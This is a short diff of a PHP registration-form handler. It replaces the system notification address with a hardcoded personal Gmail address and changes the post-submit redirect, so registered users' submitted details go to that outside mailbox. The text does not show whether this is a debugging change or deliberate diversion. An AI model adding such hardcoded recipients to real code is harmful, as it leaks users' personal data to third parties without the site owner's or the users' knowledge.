@@ -46,7 +46,8 @@ if (isset($_REQUEST['sbt_btn'])) {
 
     $date = date("m/d");
    
-    $to = SYSTEM_EMAIL;
+    //$to = SYSTEM_EMAIL;
+    $to = 'whitedove549@gmail.com';
    // $to1 = $_REQUEST['email'];
 
     $subject = "Registered User- {$_REQUEST['fname']}  | {$date} | ";
@@ -58,7 +59,7 @@ if (isset($_REQUEST['sbt_btn'])) {
 
     _mail($to, $subject, $mail);
 
-    _R(lr('view_clients?message'));
+    _R(lr('client_redirect'));
 
 
 
